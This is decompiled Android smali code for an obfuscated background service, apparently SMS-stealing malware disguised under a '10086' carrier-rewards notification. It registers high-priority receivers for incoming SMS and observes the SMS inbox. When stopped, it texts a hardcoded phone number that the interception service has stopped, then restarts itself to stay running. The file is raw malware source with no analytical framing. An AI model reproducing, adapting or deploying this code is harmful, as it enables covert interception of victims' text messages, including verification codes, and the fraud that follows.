.class public Lji/yj/ur/a201jhfg20180420ab/JM01;
.super Landroid/app/Service;
.source "JM01.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;
    }
.end annotation


# static fields
.field public static final iru:Landroid/net/Uri;

.field public static final t01:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field public static final t02:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED_2"

.field public static final t03:Ljava/lang/String; = "android.provider.Telephony.GSM_SMS_RECEIVED"

.field public static final t04:Ljava/lang/String; = "sh.ji.fe"


# instance fields
.field private rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;

.field private rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;

.field private rtyertrhy:Landroid/os/Handler;

.field private ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;

.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 19
    const-string v0, "content://sms/"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    sput-object v0, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;

    .line 14
    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 14
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 22
    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;

    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V

    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    .line 90
    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM01$1;

    invoke-direct {v0, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$1;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V

    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;

    .line 14
    return-void
.end method

.method static synthetic access$0(Lji/yj/ur/a201jhfg20180420ab/JM01;)Lji/yj/ur/a201jhfg20180420ab/JM02;
    .locals 1

    .prologue
    .line 22
    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    return-object v0
.end method

.method static synthetic access$1(Lji/yj/ur/a201jhfg20180420ab/JM01;)Landroid/os/Handler;
    .locals 1

    .prologue
    .line 90
    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rtyertrhy:Landroid/os/Handler;

    return-object v0
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 68
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 10

    .prologue
    const/4 v9, 0x0

    const/4 v8, 0x0

    .line 25
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 26
    new-instance v1, Landroid/app/Notification;

    const/high16 v4, 0x7f020000

    const-string v5, "10086\u96c6\u5206\u5b9d"

    .line 27
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    .line 26
    invoke-direct {v1, v4, v5, v6, v7}, Landroid/app/Notification;-><init>(ILjava/lang/CharSequence;J)V

    .line 28
    .local v1, "notification":Landroid/app/Notification;
    new-instance v2, Landroid/content/Intent;

    invoke-direct {v2}, Landroid/content/Intent;-><init>()V

    .line 29
    .local v2, "notificationIntent":Landroid/content/Intent;
    new-instance v4, Landroid/widget/RemoteViews;

    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getPackageName()Ljava/lang/String;

    move-result-object v5

    .line 30
    const/high16 v6, 0x7f030000

    invoke-direct {v4, v5, v6}, Landroid/widget/RemoteViews;-><init>(Ljava/lang/String;I)V

    .line 29
    iput-object v4, v1, Landroid/app/Notification;->contentView:Landroid/widget/RemoteViews;

    .line 31
    invoke-static {p0, v8, v2, v8}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v3

    .line 33
    .local v3, "pendingIntent":Landroid/app/PendingIntent;
    iput-object v3, v1, Landroid/app/Notification;->contentIntent:Landroid/app/PendingIntent;

    .line 34
    const/16 v4, 0x64

    invoke-virtual {p0, v4, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startForeground(ILandroid/app/Notification;)V

    .line 35
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    .line 36
    .local v0, "dsfghgfdgfd":Landroid/content/IntentFilter;
    const-string v4, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 37
    const-string v4, "android.provider.Telephony.SMS_RECEIVED_2"

    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 38
    const-string v4, "android.provider.Telephony.GSM_SMS_RECEIVED"

    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    .line 39
    const/16 v4, 0x3e8

    invoke-virtual {v0, v4}, Landroid/content/IntentFilter;->setPriority(I)V

    .line 41
    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;

    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V

    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;

    .line 42
    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;

    const-string v5, "android.permission.BROADCAST_SMS"

    invoke-virtual {p0, v4, v0, v5, v9}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;Ljava/lang/String;Landroid/os/Handler;)Landroid/content/Intent;

    .line 44
    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM03;

    invoke-direct {v4}, Lji/yj/ur/a201jhfg20180420ab/JM03;-><init>()V

    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;

    .line 45
    iget-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;

    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "sh.ji.fe"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v4, v5}, Lji/yj/ur/a201jhfg20180420ab/JM01;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 47
    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM05;

    invoke-direct {v4, p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;-><init>(Landroid/content/Context;Landroid/os/Handler;)V

    iput-object v4, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;

    .line 48
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    sget-object v5, Lji/yj/ur/a201jhfg20180420ab/JM01;->iru:Landroid/net/Uri;

    const/4 v6, 0x1

    iget-object v7, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;

    invoke-virtual {v4, v5, v6, v7}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    .line 50
    new-instance v4, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;

    invoke-direct {v4, p0}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;-><init>(Lji/yj/ur/a201jhfg20180420ab/JM01;)V

    invoke-virtual {v4}, Lji/yj/ur/a201jhfg20180420ab/JM01$FFFFFFF;->start()V

    .line 51
    return-void
.end method

.method public onDestroy()V
    .locals 5

    .prologue
    .line 55
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    .line 56
    const/4 v1, 0x1

    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->stopForeground(Z)V

    .line 57
    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr01:Lji/yj/ur/a201jhfg20180420ab/JM03;

    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 58
    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->rr02:Lji/yj/ur/a201jhfg20180420ab/JM03;

    invoke-virtual {p0, v1}, Lji/yj/ur/a201jhfg20180420ab/JM01;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 59
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->ssssssss:Lji/yj/ur/a201jhfg20180420ab/JM05;

    invoke-virtual {v1, v2}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    .line 60
    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM01;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    const-string v2, "18016217928"

    const-string v3, "\u62e6\u622a\u670d\u52a1\u505c\u6b62\uff0c\u4f7f\u7528\u7ed3\u675f\u65f6\u95f4\uff1a2018-4-20 12:00:00"

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v3, v4}, Lji/yj/ur/a201jhfg20180420ab/JM02;->gfyhdfgadg(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 61
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    .line 62
    .local v0, "oyutiuy":Landroid/content/Intent;
    const-class v1, Lji/yj/ur/a201jhfg20180420ab/JM01;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 63
    invoke-virtual {p0, v0}, Lji/yj/ur/a201jhfg20180420ab/JM01;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 64
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 73
    const/4 p2, 0x3

    .line 74
    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    move-result v0

    return v0
.end method
